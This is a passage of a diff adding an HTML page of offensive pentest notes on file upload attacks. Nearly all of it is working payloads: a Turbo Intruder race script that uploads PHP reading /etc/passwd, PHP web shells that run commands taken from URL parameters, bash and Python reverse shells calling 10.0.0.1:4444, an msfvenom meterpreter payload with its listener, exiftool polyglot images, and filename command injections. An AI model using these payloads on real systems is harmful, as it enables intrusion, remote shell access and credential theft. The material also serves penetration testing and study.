+We can easily achieve that with <strong>Turbo Intruder</strong> in <strong>Burp Suite</strong>.</p>
+<pre><code class="language-python">def queueRequests(target, wordlists):
+    engine = RequestEngine(endpoint=target.endpoint,
+                        concurrentConnections=10,)
+
+    request_post = '''POST /avatar/upload HTTP/1.1
+Host: vulnerable.com
+...
+...
+Connection: close
+
+------abcdefghi
+Content-Disposition: form-data; name="avatar"; filename="exploit.php"
+Content-Type: application/x-php
+
+&lt;?php echo file_get_contents('/etc/passwd');  ?&gt;
+
+------abcdefghijk--
+
+'''
+
+    request_get = '''GET /files/avatars/exploit.php HTTP/1.1
+Host: vulnerable.com
+...
+...
+Connection: close
+
+
+'''
+
+    engine.queue(request_post, gate='race1')
+    for i in range(5):
+        engine.queue(request_get, gate='race1')
+
+
+    engine.openGate('race1')
+    engine.complete(timeout=60)
+    
+
+
+def handleResponse(req, interesting):
+    table.add(req)
+</code></pre>
+<h2 id="php-payloads"><a class="header" href="#php-payloads"><a href="https://exploit-notes.hdks.org/exploit/web/security-risk/file-upload-attack/#php-payloads">PHP Payloads</a></a></h2>
+<p>After finding vulnerability, we can create a payload for exploiting the website.<br />
+Here is the example payloads of <strong>web shell</strong> and <strong>reverse shell</strong> to compromise target system.</p>
+<h3 id="web-shell"><a class="header" href="#web-shell"><a href="https://exploit-notes.hdks.org/exploit/web/security-risk/file-upload-attack/#web-shell">Web Shell</a></a></h3>
+<p>For example, the file name is "exploit.php".</p>
+<pre><code class="language-php">// Simply showing the result of 'whoami'.
+&lt;?php echo system('whoami'); ?&gt;
+
+// This shows the content of "/etc/passwd".
+&lt;?php echo file_get_contents('/etc/passwd');  ?&gt;
+
+// We can execute arbitrary commands by passing the url parameter e.g. "/exploit.php?cmd=whoami"
+&lt;?php echo system($_GET['cmd']); ?&gt;
+</code></pre>
+<h3 id="reverse-shell-for-linux"><a class="header" href="#reverse-shell-for-linux"><a href="https://exploit-notes.hdks.org/exploit/web/security-risk/file-upload-attack/#reverse-shell-for-linux">Reverse Shell for Linux</a></a></h3>
+<pre><code class="language-sh">wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php -O shell.php
+# or
+cp /usr/share/webshells/php/php-reverse-shell.php ./shell.php
+
+# Edit some variables in the payload
+$ip = '&lt;attacker-ip&gt;'
+$port = 4444
+</code></pre>
+<p>Or we might be able to use the following simple script.</p>
+<pre><code class="language-php">&lt;?php shell_exec("/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/10.0.0.1/4444 0&gt;&amp;1'"); ?&gt;
+</code></pre>
+<p>Then open listener for getting a shell.</p>
+<pre><code class="language-sh">nc -lvnp 4444
+</code></pre>
+<p>After uploading it, reload the page in which the payload uploaded e.g. <code>"/upload/shell.php"</code>.</p>
+<h3 id="reverse-shell-for-windows"><a class="header" href="#reverse-shell-for-windows"><a href="https://exploit-notes.hdks.org/exploit/web/security-risk/file-upload-attack/#reverse-shell-for-windows">Reverse Shell for Windows</a></a></h3>
+<p>First create a malicious executable file using msfvenom.<br />
+Replace <strong>10.0.0.1</strong> with your local ip.</p>
+<pre><code class="language-sh"># -f: Format
+# -p: Payload
+# -o: Output file
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe -o cv-username.exe
+</code></pre>
+<p>Next start a listener for getting the target shell.</p>
+<pre><code class="language-sh"># -x: Execute command
+sudo msfconsole -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 10.0.0.1; set LPORT 4444; exploit"
+</code></pre>
+<p>After getting the shell, we will get in the meterpreter, so we need to know the meterpreter’s commands. To get a list of command, run the following in the meterpreter.</p>
+<pre><code class="language-sh"># Usage command
+meterpreter&gt; ?
+</code></pre>
+<h2 id="other-tips"><a class="header" href="#other-tips"><a href="https://exploit-notes.hdks.org/exploit/web/security-risk/file-upload-attack/#other-tips">Other Tips</a></a></h2>
+<h3 id="craft-upload-request"><a class="header" href="#craft-upload-request"><a href="https://exploit-notes.hdks.org/exploit/web/security-risk/file-upload-attack/#craft-upload-request">Craft Upload Request</a></a></h3>
+<p>If website does not display the upload page but such functionality exists on the website, we can manually create the uploading request.<br />
+First off, we need to set <strong><code>multipart/form-data; boundary=&lt;arbitrary_characters&gt;</code></strong> to <strong>Content-Type</strong> in <strong>HTTP headers</strong> as below.<br />
+Of course we need to specify the <strong>POST</strong> method at the top of the header.</p>
+<pre><code class="language-html">Content-Type: multipart/form-data; boundary=abcdef
+</code></pre>
+<p>Then we can surround <strong>POST body (to upload file)</strong> with this boundary as the following.</p>
+<pre><code class="language-html">--abcdef
+Content-Disposition: form-data; name="profile"; filename="test.png"
+Content-Type: image/jpeg
+
+some code here...
+--abcdef--
+</code></pre>
+<h2 id="polyglot-attack"><a class="header" href="#polyglot-attack"><a href="https://exploit-notes.hdks.org/exploit/web/security-risk/file-upload-attack-on-exiftool/#polyglot-attack">Polyglot Attack</a></a></h2>
+<p>We might be able to execute remote code by polyglotting the original plain image file.<br />
+At first, create a blank image file as below, but this step may be not required if you already have some image file.</p>
+<pre><code class="language-sh">convert -size 32x32 xc:white test.jpg
+</code></pre>
+<p>Then insert <strong>OS command</strong> with <strong>exiftool</strong>.</p>
+<pre><code class="language-sh">exiftool -Comment="&lt;?php system('ls'); ?&gt;" example.png
+exiftool -Comment='&lt;?php echo "&lt;pre&gt;"; system($_GET['cmd']); ?&gt;' exploit.png
+exiftool -Comment="&lt;?php echo 'START ' . file_get_contents('/etc/passwd') . ' END'; ?&gt;" example.jpg -o polyglot.php
+</code></pre>
+<h2 id="command-injection-version--v1238"><a class="header" href="#command-injection-version--v1238"><a href="https://exploit-notes.hdks.org/exploit/web/security-risk/file-upload-attack-on-exiftool/#command-injection-(version-%3C-v12.38)">Command Injection (version &lt; v12.38)</a></a></h2>
+<p>On Exiftool version lower than <strong>12.38</strong>, we can inject <strong>OS command</strong> in the filename when uploading.</p>
+<pre><code class="language-bash"># Ping
+filename="touch test; ping -c 1 10.0.0.1 |"
+
+# Reverse shell
+filename="touch test; bash -i &gt;&amp; /dev/tcp/10.0.0.1/4444 0&gt;&amp;1 |"
+filename="touch test; bash -c \"bash -i &gt;&amp; /dev/tcp/10.0.0.1/4444 0&gt;&amp;1\" |"
+filename="touch test; python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"10.0.0.1\", 1234));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"bash\")' |"
+</code></pre>
+
+                    </main>
+
+                    <nav class="nav-wrapper" aria-label="Page navigation">
+                        <!-- Mobile navigation buttons -->
+                            <a rel="prev" href="File Uploads.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                                <i class="fa fa-angle-left"></i>
+                            </a>
+
+                            <a rel="next prefetch" href="htmlfileupload.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                                <i class="fa fa-angle-right"></i>
+                            </a>
+
+                        <div style="clear: both"></div>
+                    </nav>
+                </div>
+            </div>
+
+            <nav class="nav-wide-wrapper" aria-label="Page navigation">
+                    <a rel="prev" href="File Uploads.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                        <i class="fa fa-angle-left"></i>
+                    </a>
+
+                    <a rel="next prefetch" href="htmlfileupload.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                        <i class="fa fa-angle-right"></i>
+                    </a>
+            </nav>
+
+        </div>
+
+        <!-- Livereload script (if served using the cli tool) -->
+        <script>
+            const wsProtocol = location.protocol === 'https:' ? 'wss:' : 'ws:';
+            const wsAddress = wsProtocol + "//" + location.host + "/" + "__livereload";
+            const socket = new WebSocket(wsAddress);
+            socket.onmessage = function (event) {
+                if (event.data === "reload") {
+                    socket.close();
+                    location.reload();
+                }
+            };
+
+            window.onbeforeunload = function() {
+                socket.close();
+            }
+        </script>
+
+
+
+        <script>
+            window.playground_copyable = true;
+        </script>
+
+
+        <script src="elasticlunr.min.js"></script>
+        <script src="mark.min.js"></script>
+        <script src="searcher.js"></script>
+
+        <script src="clipboard.min.js"></script>
+        <script src="highlight.js"></script>
+        <script src="book.js"></script>
+
+        <!-- Custom JS scripts -->
+
+
+    </div>
+    </body>
+</html>
